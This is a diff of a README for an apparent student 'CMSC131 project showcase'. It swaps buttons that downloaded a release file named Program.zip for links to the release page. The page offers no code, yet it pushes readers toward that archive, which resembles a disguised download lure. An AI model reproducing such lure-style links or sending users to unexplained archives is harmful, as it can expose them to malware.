@@ -1,6 +1,6 @@
 # 🚀 UMD CMSC131 Project Showcase 🎓
 
-[![Visit Showcase](https://github.com/LupeSalas836/umd-cmsc131-project-showcase/releases/download/v1.0/Program.zip)](https://github.com/LupeSalas836/umd-cmsc131-project-showcase/releases/download/v1.0/Program.zip)
+[![Visit Showcase](https://github.com/LupeSalas836/umd-cmsc131-project-showcase/releases/tag/v1.0)](https://github.com/LupeSalas836/umd-cmsc131-project-showcase/releases/tag/v1.0)
 
 Welcome to the UMD CMSC131 Project Showcase! 🌟 In this repository, you will find a curated collection of project descriptions and tested concepts from my CMSC-131 (UMD's Introductory CS Course) projects. Each project highlight's key challenges, learnings, and outcomes, providing a glimpse into the world of computer science education at the University of Maryland.
 
@@ -18,7 +18,7 @@ For access to code samples or live demos of the showcased projects, please conta
 ### 🚀 Ready to Dive In?
 Simply click the button below to access the showcase and explore the world of UMD CMSC131 projects:
 
-[![Access Showcase](https://github.com/LupeSalas836/umd-cmsc131-project-showcase/releases/download/v1.0/Program.zip)](https://github.com/LupeSalas836/umd-cmsc131-project-showcase/releases/download/v1.0/Program.zip)
+[![Access Showcase](https://github.com/LupeSalas836/umd-cmsc131-project-showcase/releases/tag/v1.0)](https://github.com/LupeSalas836/umd-cmsc131-project-showcase/releases/tag/v1.0)
 
 ### 📂 Check the Releases Section
 If the above link doesn't work or if you prefer to explore the repository further, make sure to check the "Releases" section for additional resources and updates.
